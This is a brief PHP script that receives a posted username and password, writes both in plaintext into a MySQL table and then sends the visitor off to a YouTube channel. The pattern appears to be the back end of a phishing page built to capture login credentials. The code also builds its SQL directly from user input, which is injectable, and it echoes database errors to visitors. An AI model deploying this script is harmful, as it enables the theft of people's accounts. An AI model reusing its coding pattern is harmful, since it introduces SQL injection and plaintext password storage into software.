    <?php
if ($_SERVER['REQUEST_METHOD'] === 'POST') { 
    $username = filter_input(INPUT_POST, 'username');
    $password = filter_input(INPUT_POST, 'password');
  

//Configure it before using  
	$host = "Database_Host_here";
    $dbusername = "Database_Username_here";
    $dbpassword = "Database_Password_here";
    $dbname = "Database_Name_here";
//Configuration ends here 
 
 
    $conn = new mysqli ($host, $dbusername, $dbpassword, $dbname);
    if (mysqli_connect_error()){
    die('Connect Error ('. mysqli_connect_errno() .') '
    . mysqli_connect_error());
    }
    else{
		
//Configure it before using 		
    $sql = "INSERT INTO Sub_Database_Name_here (username, password)
    values ('$username','$password')";
    if ($conn->query($sql)){
    echo "Link Success";
    }
    else{
    echo "Link Error: ". $sql ."
    ". $conn->error;
    }
    $conn->close();
    }
    	 echo'<script>window.location.replace("http://www.youtube.com/c/greenterminals");</script>';
		die();
	
	} else {
	 echo'<script>window.location.replace("./meta_tags.html");</script>';
		die();
	}
    
    ?>